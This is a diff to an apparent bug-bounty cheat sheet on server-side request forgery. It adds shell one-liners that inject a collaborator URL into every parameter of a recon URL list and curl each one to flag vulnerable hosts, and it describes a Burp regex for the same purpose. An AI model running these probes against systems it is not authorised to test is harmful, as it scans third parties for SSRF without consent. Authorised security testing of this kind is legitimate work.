@@ -760,7 +760,10 @@ Top 25 Server-Side Request Forgery (SSRF) Parameters for @trbughunters
 install autorepeater and baseplacement => add request params value , match => https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)      and replace => https://collaborator and can automate katana --proxy 127.0.0.1 8080 => to automate ssrf and go to collaborator and see the results 
 
 
+SSRF through Curl
 
+✔️cat recon.txt | qsreplace "http://bcollaborator.com" > ssrf.txt
+✔️cat ssrf.txt | while read host do;do curl -s -L $host -I|grep "http://bcollaborator.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
 
 
 --------------------------------------------------------------------------------------------------
